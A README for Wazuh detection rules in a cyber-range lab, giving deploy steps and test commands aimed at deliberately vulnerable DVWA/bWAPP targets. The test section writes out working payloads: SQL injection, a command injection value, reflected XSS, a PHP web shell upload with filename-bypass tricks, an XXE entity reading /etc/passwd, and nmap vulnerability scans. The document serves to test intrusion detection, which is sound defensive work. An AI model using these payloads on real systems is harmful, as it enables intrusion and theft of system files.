# Wazuh Attack Rules (Cyber Range)

Files included:
- `local_rules_attacks.xml` — Wazuh rule set for SQLi, XSS, Command Injection, Brute Force, and scanner detection.
- `deploy_rules.sh` — Small helper script to SCP the file to the Wazuh manager (10.72.200.55) and restart the manager. Edit the script and set `MANAGER_USER`.

Quick deploy (example):
1. Copy `local_rules_attacks.xml` to the Wazuh Manager:
   scp local_rules_attacks.xml youruser@10.72.200.55:/tmp/
2. Move into place and restart manager (on manager):
   sudo mv /tmp/local_rules_attacks.xml /var/ossec/etc/rules/local_rules.xml
   sudo systemctl restart wazuh-manager

Testing
-------
- From an internal host (e.g., the target 10.72.200.54) test examples:
  - SQLi test:
    curl 'http://10.72.200.54:9080/search?q=1%27+OR+%271%27=%271'

  - Command injection test (exec endpoint):
    curl "http://10.72.200.54:9090/vulnerabilities/exec/?ip=127.0.0.1;ls+-la"

  - XSS test (simple):
    curl "http://10.72.200.54:9090/vulnerabilities/xss_r/?name=<script>alert(1)</script>"

  - SQLi test (example):
    curl 'http://10.72.200.54:9080/search?q=1%27+OR+%271%27=%271'

  - File upload test (malicious PHP shell, use upload endpoint on bWAPP):
    echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
    curl -v -F "uploaded=@/tmp/shell.php;filename=shell.php.jpg;type=image/jpeg" "http://10.72.200.54:9090/vulnerabilities/upload/"
    # Also try filename tricks:
    curl -v -F "uploaded=@/tmp/shell.php;filename=shell.php%00.jpg;type=image/jpeg" "http://10.72.200.54:9090/vulnerabilities/upload/"

  - Command injection test (exec endpoint):
    curl "http://10.72.200.54:9090/vulnerabilities/exec/?ip=127.0.0.1;ls+-la"

  - Brute force test (bWAPP login):
    curl -X POST -d "login=bee&password=wrong" "http://10.72.200.54:9080/bWAPP/login.php"
    # Repeat failed logins to trigger brute-force rule

  - XXE test (send crafted XML to bWAPP XXE endpoint):
    cat > /tmp/xxe_payload.xml <<'XML'
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "file:///etc/passwd" >
    ]>
    <reset>
      <login>&xxe;</login>
      <secret>test</secret>
    </reset>
    XML

    curl -v -H "Content-Type: application/xml" --data-binary @/tmp/xxe_payload.xml "http://10.72.200.54:9080/bWAPP"

  - Nmap / network scan test (run from an attacker host targeting 10.72.200.54):
    nmap -sS -p1-1024 10.72.200.54
    nmap -sV --script=vuln 10.72.200.54

Covered endpoints (exercise targets):
- http://10.72.200.54:9090/vulnerabilities/sqli
- http://10.72.200.54:9080/search (SQLi example)
- http://10.72.200.54:9090/vulnerabilities/xss_r/
- http://10.72.200.54:9090/vulnerabilities/exec/
- http://10.72.200.54:9090/vulnerabilities/upload/
- http://10.72.200.54:9080/bWAPP (including /login.php and XXE endpoints)

- Watch alerts on the Wazuh dashboard: https://10.72.200.55 (Kibana/Wazuh app)

Tuning and notes
----------------
- The rules are intentionally broad; tune the regex, thresholds (frequency/timeframe) and rule levels to reduce false positives.
- For production or proctored exercises, consider adding decoders specific to your web server logs (Apache/Nginx), and target URL path filtering to reduce noise.
- If you want automatic blocking, I can provide example `active-response` rules using `firewalld`/`iptables` or `fail2ban`-style responses.

Contact
-------
If you want me to install the rules automatically or add active-response blocks, tell me which host you want to target first (Manager or Agent).